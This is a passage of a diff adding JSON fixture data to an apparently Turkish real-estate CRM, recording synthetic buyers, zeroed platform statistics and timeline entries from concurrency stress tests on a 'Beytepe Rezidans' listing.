+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 10 timestamp 1793518167.1372015",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_405",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #09 (Kemal Koç)",
+        "phone": "+90 532 999 09 09",
+        "offer": "12.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 9 timestamp 1793518167.1366863",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_703",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #11 (Kemal Koç)",
+        "phone": "+90 532 999 11 11",
+        "offer": "12.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 11 timestamp 1793518167.1382406",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_528",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #08 (Kemal Koç)",
+        "phone": "+90 532 999 08 08",
+        "offer": "12.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 8 timestamp 1793518167.1361642",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_201",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #06 (Kemal Koç)",
+        "phone": "+90 532 999 06 06",
+        "offer": "11.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 6 timestamp 1793518167.133537",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_544",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #07 (Kemal Koç)",
+        "phone": "+90 532 999 07 07",
+        "offer": "11.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 7 timestamp 1793518167.1340597",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_653",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #04 (Kemal Koç)",
+        "phone": "+90 532 999 04 04",
+        "offer": "11.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 4 timestamp 1793518167.1325014",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_165",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #05 (Kemal Koç)",
+        "phone": "+90 532 999 05 05",
+        "offer": "11.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 5 timestamp 1793518167.1330194",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_666",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #03 (Kemal Koç)",
+        "phone": "+90 532 999 03 03",
+        "offer": "10.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 3 timestamp 1793518167.131453",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_630",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #02 (Kemal Koç)",
+        "phone": "+90 532 999 02 02",
+        "offer": "10.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 2 timestamp 1793518167.1308472",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_360",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #01 (Kemal Koç)",
+        "phone": "+90 532 999 01 01",
+        "offer": "10.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 1 timestamp 1793518167.1308472",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #19 (Kemal Koç)",
+        "note": "Teklif: 14.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #20 (Kemal Koç)",
+        "note": "Teklif: 15.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #18 (Kemal Koç)",
+        "note": "Teklif: 14.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #17 (Kemal Koç)",
+        "note": "Teklif: 14.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #14 (Kemal Koç)",
+        "note": "Teklif: 13.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #16 (Kemal Koç)",
+        "note": "Teklif: 14.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #15 (Kemal Koç)",
+        "note": "Teklif: 13.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #12 (Kemal Koç)",
+        "note": "Teklif: 13.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #13 (Kemal Koç)",
+        "note": "Teklif: 13.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #10 (Kemal Koç)",
+        "note": "Teklif: 12.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #09 (Kemal Koç)",
+        "note": "Teklif: 12.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #11 (Kemal Koç)",
+        "note": "Teklif: 12.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #08 (Kemal Koç)",
+        "note": "Teklif: 12.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #06 (Kemal Koç)",
+        "note": "Teklif: 11.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #07 (Kemal Koç)",
+        "note": "Teklif: 11.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #04 (Kemal Koç)",
+        "note": "Teklif: 11.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #05 (Kemal Koç)",
+        "note": "Teklif: 11.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #03 (Kemal Koç)",
+        "note": "Teklif: 10.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #02 (Kemal Koç)",
+        "note": "Teklif: 10.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518167",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #01 (Kemal Koç)",
+        "note": "Teklif: 10.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "audit_concurrency_listing_1793518262": {
+    "refId": "audit_concurrency_listing_1793518262",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793518262_145",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #20 (Kemal Koç)",
+        "phone": "+90 532 999 20 20",
+        "offer": "15.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 20 timestamp 1793518262.8845572",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_762",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #19 (Kemal Koç)",
+        "phone": "+90 532 999 19 19",
+        "offer": "14.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 19 timestamp 1793518262.8835552",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_499",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #17 (Kemal Koç)",
+        "phone": "+90 532 999 17 17",
+        "offer": "14.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 17 timestamp 1793518262.8825545",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_366",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #18 (Kemal Koç)",
+        "phone": "+90 532 999 18 18",
+        "offer": "14.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 18 timestamp 1793518262.8825545",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_377",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #16 (Kemal Koç)",
+        "phone": "+90 532 999 16 16",
+        "offer": "14.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 16 timestamp 1793518262.8815546",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_834",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #14 (Kemal Koç)",
+        "phone": "+90 532 999 14 14",
+        "offer": "13.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 14 timestamp 1793518262.8805525",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_498",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #15 (Kemal Koç)",
+        "phone": "+90 532 999 15 15",
+        "offer": "13.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 15 timestamp 1793518262.8805525",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_452",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #13 (Kemal Koç)",
+        "phone": "+90 532 999 13 13",
+        "offer": "13.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 13 timestamp 1793518262.8800395",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_476",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #12 (Kemal Koç)",
+        "phone": "+90 532 999 12 12",
+        "offer": "13.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 12 timestamp 1793518262.8789947",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_446",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #11 (Kemal Koç)",
+        "phone": "+90 532 999 11 11",
+        "offer": "12.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 11 timestamp 1793518262.8774383",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_204",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #10 (Kemal Koç)",
+        "phone": "+90 532 999 10 10",
+        "offer": "12.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 10 timestamp 1793518262.8769143",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_221",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #09 (Kemal Koç)",
+        "phone": "+90 532 999 09 09",
+        "offer": "12.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 9 timestamp 1793518262.8757827",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_607",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #08 (Kemal Koç)",
+        "phone": "+90 532 999 08 08",
+        "offer": "12.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 8 timestamp 1793518262.8747559",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_604",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #06 (Kemal Koç)",
+        "phone": "+90 532 999 06 06",
+        "offer": "11.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 6 timestamp 1793518262.8732185",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_933",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #07 (Kemal Koç)",
+        "phone": "+90 532 999 07 07",
+        "offer": "11.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 7 timestamp 1793518262.8737304",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_859",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #04 (Kemal Koç)",
+        "phone": "+90 532 999 04 04",
+        "offer": "11.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 4 timestamp 1793518262.8716762",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_107",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #05 (Kemal Koç)",
+        "phone": "+90 532 999 05 05",
+        "offer": "11.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 5 timestamp 1793518262.8727052",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_559",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #03 (Kemal Koç)",
+        "phone": "+90 532 999 03 03",
+        "offer": "10.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 3 timestamp 1793518262.8706467",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_608",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #01 (Kemal Koç)",
+        "phone": "+90 532 999 01 01",
+        "offer": "10.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 1 timestamp 1793518262.8701332",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518262_769",
+        "refId": "audit_concurrency_listing_1793518262",
+        "name": "Eşzamanlı Alıcı #02 (Kemal Koç)",
+        "phone": "+90 532 999 02 02",
+        "offer": "10.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 2 timestamp 1793518262.8701332",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #20 (Kemal Koç)",
+        "note": "Teklif: 15.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #19 (Kemal Koç)",
+        "note": "Teklif: 14.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #17 (Kemal Koç)",
+        "note": "Teklif: 14.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #18 (Kemal Koç)",
+        "note": "Teklif: 14.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #16 (Kemal Koç)",
+        "note": "Teklif: 14.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #14 (Kemal Koç)",
+        "note": "Teklif: 13.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #15 (Kemal Koç)",
+        "note": "Teklif: 13.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #13 (Kemal Koç)",
+        "note": "Teklif: 13.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #12 (Kemal Koç)",
+        "note": "Teklif: 13.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #11 (Kemal Koç)",
+        "note": "Teklif: 12.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #10 (Kemal Koç)",
+        "note": "Teklif: 12.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #09 (Kemal Koç)",
+        "note": "Teklif: 12.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #08 (Kemal Koç)",
+        "note": "Teklif: 12.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #06 (Kemal Koç)",
+        "note": "Teklif: 11.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #07 (Kemal Koç)",
+        "note": "Teklif: 11.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #04 (Kemal Koç)",
+        "note": "Teklif: 11.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #05 (Kemal Koç)",
+        "note": "Teklif: 11.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #03 (Kemal Koç)",
+        "note": "Teklif: 10.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #01 (Kemal Koç)",
+        "note": "Teklif: 10.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #02 (Kemal Koç)",
+        "note": "Teklif: 10.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "test_listing_1793518271": {
+    "refId": "test_listing_1793518271",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793518271_568",
+        "refId": "test_listing_1793518271",
+        "name": "Ahmet Yılmaz (Test Alıcı)",
+        "phone": "+90 532 999 88 77",
+        "offer": "14.500.000 ₺",
+        "stage": "Teklif Verildi",
